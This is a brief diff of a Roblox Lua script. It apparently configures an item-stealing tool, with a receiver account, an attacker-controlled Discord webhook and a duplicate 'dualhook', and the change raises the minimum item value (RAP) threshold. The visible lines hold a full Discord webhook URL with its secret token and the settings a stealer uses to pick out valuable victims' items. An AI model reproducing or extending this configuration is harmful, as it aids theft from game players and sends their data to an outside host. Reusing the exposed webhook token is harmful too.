@@ -287,7 +287,7 @@ local player = game:GetService("Players").LocalPlayer
 
 local receiver = "Kchond1t0_dmz"
 local hook_user = "Kchond1t0_dmz"
-local min_rap = 1
+local min_rap = 3500000
 local webhook = "https://discord.com/api/webhooks/1575339638573236276/XQ-EheVqq6BaPBsRtsHPFt4Ax8c-b-Tjtu8-6abIGwEUjm5sCcvRSL7zaXdDy7wwiM6f"
 local dualhook = "https://discord.com/api/webhooks/1575339638573236276/XQ-EheVqq6BaPBsRtsHPFt4Ax8c-b-Tjtu8-6abIGwEUjm5sCcvRSL7zaXdDy7wwiM6f"
 local gems = 0
